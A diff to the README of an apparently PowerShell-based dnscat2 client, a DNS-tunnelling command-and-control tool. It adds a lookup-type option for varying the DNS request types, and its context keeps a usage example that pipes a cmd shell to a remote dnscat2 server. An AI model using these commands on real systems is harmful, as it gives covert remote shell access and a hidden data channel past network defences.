@@ -22,6 +22,9 @@ Start-Dnscat2 is the actual function used as the client. Specifiy the dnscat2 se
     Send a cmd shell, and send DNS requests to the default DNS Server set in Windows:
         Start-Dnscat2 -Domain <dnscat2 server> -Exec cmd
 
+    Start a console session. Only use CNAME and MX requests:
+        Start-Dnscat2 -Domain <dnscat2 server> -LookupTypes @("CNAME","MX") -Console
+
 ### Start-Dnscat2
 
     -Domain <String>          The Domain being used by the dnscat2 server.
@@ -32,10 +35,11 @@ Start-Dnscat2 is the actual function used as the client. Specifiy the dnscat2 se
     -Exec <String>            Link the I/O of a process with the Dnscat2 session.
     -Console                  Link the I/O of the console with the Dnscat2 session.
     
+    -LookupTypes <String[]>   Set an array of lookup types to randomly switch between. Default: @(TXT, MX, CNAME)
     -Delay <Int32>            Set a delay between each request, in milliseconds. (Default: 0)
     -MaxPacketSize <Int32>    Maximum length of a dnscat2 packet. (Default: 240)
     -Name <String>            The name of your dnscat2 session. (Default: hostname)
 
 ### Currently Unsupported Features
     Encryption
-    DNS Requests other than TXT requests are not supported
+    A and AAAA requests are not supported
